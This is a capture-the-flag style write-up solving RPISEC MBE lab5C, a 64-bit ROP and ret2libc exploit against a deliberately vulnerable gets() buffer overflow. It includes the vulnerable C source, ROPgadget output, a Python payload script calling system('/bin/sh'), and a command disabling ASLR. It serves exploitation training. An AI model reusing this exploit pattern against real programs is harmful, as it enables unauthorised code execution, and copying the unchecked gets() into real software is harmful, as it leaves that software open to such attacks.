### Solving lab5C "03/13 | --[ ROP Lab" (https://github.com/RPISEC/MBE/blob/master/src/lab05/lab5C.c)


### This lab is related to the exploration of DEP/NX.

First I'll talk about the problem I had with compiling the binary. This lab is made for 32-bit architecture and the exploit is also 32-bit based. And my idea was to do it in 64. So, due to some problems with address randomization, I had to add the ``` -no-pie``` flag to compile it. It was compiled like this:

```gcc lab5C.c -o lab5C -fno-stack-protector -no-pie```


As the exploration learned in the slides is for 32 bits, I had to use a technique aimed at 64 bits. I did a step by step of this technique here: https://github.com/geleiaa/lowlevel_things/blob/main/rpisec_mbe_labs/bypass_NX/bypass_NX_explain.md

And now let's see how it was applied in this binary.


Let's look at the source code to see what the binary does.

```c
#include <stdlib.h>
#include <stdio.h>

/* gcc -fno-stack-protector -o lab5C lab5C.c */

char global_str[128];

/* reads a string, copies it to a global */
void copytoglobal()
{
    char buffer[128] = {0};
    gets(buffer);
    memcpy(global_str, buffer, 128);
}

int main()
{
    char buffer[128] = {0};

    printf("I included libc for you...\n"\
           "Can you ROP to system()?\n");

    copytoglobal();

    return EXIT_SUCCESS;
}

```

It looks like simple code. The main prints some text. And the ``` copytoglobal() ``` function does exactly that, it takes what comes from stdin and passes it to the global variable.

Running the binary:

![runbin](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/runbinrop.png)


### To begin the exploration, let's see if we can overflow this buffer that stores the input.

Arriving at the RET of the ```copytoglobal()``` function we see that it was overwritten after 136 bytes of our pattern:

![retoverwrite](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/retoverwriterop.png)


Now that we know how to overwrite the return address of the ```copytoglobal()``` function, let's go with the ROP + ret2libc techniques.


### ROP + ret2libc

For this exploration we will need three things: 1 - address of the ```system()``` function, 2 - an argument to system(), 3 - gadgets that put this argument in the right place.


First the Gadgets. We need a "pop rdi" so that the system() function argument is passed to the RDI register and then passed to the function.

```sh
$ ROPgadget --binary lab5C --ropchain | grep pop
0x000000000040113b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401136 : mov byte ptr [rip + 0x2f03], 1 ; pop rbp ; ret
0x00000000004013ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013b0 : pop r14 ; pop r15 ; ret
0x00000000004013b2 : pop r15 ; ret
0x00000000004013ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013af : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040113d : pop rbp ; ret
0x00000000004013b3 : pop rdi ; ret  <===== this addr
0x00000000004013b1 : pop rsi ; pop r15 ; ret
0x00000000004013ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```


Now let's get the address of the system function:

![sysaddr](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/systemaddr.png)


Lastly, the address of the string "/bin/sh" that we will use as an argument for system()

![binshaddr](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/binshaddr.png)


### Having all the addresses we will put them in the exploit

```py
import sys
import struct

gadget = struct.pack("<Q", 0x00000000004013b3)

binsh_addr = struct.pack("<Q", 0x7ffff7f7f152)

sys_addr = struct.pack("<Q", 0x7ffff7e2fe50)

sys.stdout.buffer.write(b'A'*136 + gadget + binsh_addr + sys_addr)
```


### Now let's run it in GDB and see if it works.


We can see the "pop rdi" gadget followed by "/bin/sh" and system on the stack:


![exp1](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/exprop1.png)


After pop rdi is executed we see that "/bin/sh" was passed to the register:

![exp2](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/exprop2.png)

And after the system call, GDB finishes executing the binary showing that a process has been started:

![exp3](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/exprop3.png)


It seems like everything is fine, the exploit worked in the context of GDB, now let's see outside.

note: It is worth remembering that the machine's ASLR must be disabled otherwise the exploit will not work. To disable it: ```$ sudo sysctl kernel.randomize_va_space=0```


### pwn!

![exp4](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/exprop4.png)



Remembering that the idea of this laboratory was to be done in 32-bit architecture but I decided to do it in 64-bit because it was more current. In 32 bits, it changes the way exploration is done, passing system() function arguments through the stack and not through registers. The rest is basically the same.
